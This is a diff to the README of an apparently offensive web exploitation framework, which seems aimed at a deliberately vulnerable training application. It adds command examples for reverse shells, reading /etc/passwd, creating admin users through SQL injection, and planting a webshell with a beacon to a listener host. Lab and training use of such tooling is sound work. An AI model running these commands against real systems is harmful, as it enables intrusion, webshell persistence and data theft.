@@ -49,8 +49,8 @@ hwp -t http://target.com --exploit hwp-training/1.0.0-rce --payload revshell --l
 # Read a file
 hwp -t http://target.com --exploit hwp-training/1.0.0-lfi --payload file_read --file /etc/passwd
 
-# Create admin user via SQL injection
-hwp -t http://target.com --exploit hwp-training/1.0.0-sqlinj --payload admin_user
+# Create admin user via SQL injection (write-capable SQLI)
+hwp -t http://target.com --exploit hwp-training/1.0.0-sqli --payload admin_user
 
 # Scan target
 hwp -t http://target.com --scan
@@ -128,6 +128,24 @@ theme upload, media upload, then editor sinks) and triggers it. With
 `--lhost`/`--lport` set, a server-side beacon confirms execution. See
 [Framework Internals](docs/framework.md) → *XSS→RCE Adapter*.
 
+## AUTH→RCE Adapter
+
+Already hold an admin session? Deliver an RCE payload with **no exploit** — the
+stored session is the vector. The direct-HTTP twin of the XSS→RCE adapter (same
+sinks, run from your machine over authenticated requests):
+
+```bash
+# Deploy a webshell using a stored admin session
+hwp -t http://target.com --payload webshell --auth-rce-adapter
+
+# Confirm server-side execution with a beacon
+hwp -t http://target.com --payload webshell --auth-rce-adapter --lhost 10.0.0.5 --lport 8888
+```
+
+Run an AUTH exploit once; later, deliver payloads off the stored session with just
+`--payload … --auth-rce-adapter`. See
+[Framework Internals](docs/framework.md) → *AUTH→RCE Adapter*.
+
 ## Verbose Output
 
 ```bash
@@ -164,6 +182,7 @@ hwp -t target.com --clear-session
 - v1.0 100% human
 - v2.0 100% human
 - v2.1 AI Assistance was used to upgrade the framework and exploits/payloads.
+- v2.2 AI Assistance was used to rework the capability spec (enforced capability set, AUTH/PRIVESC role model, SQLI/SQLIq split, AUTH→RCE adapter).
 
 ## License
 
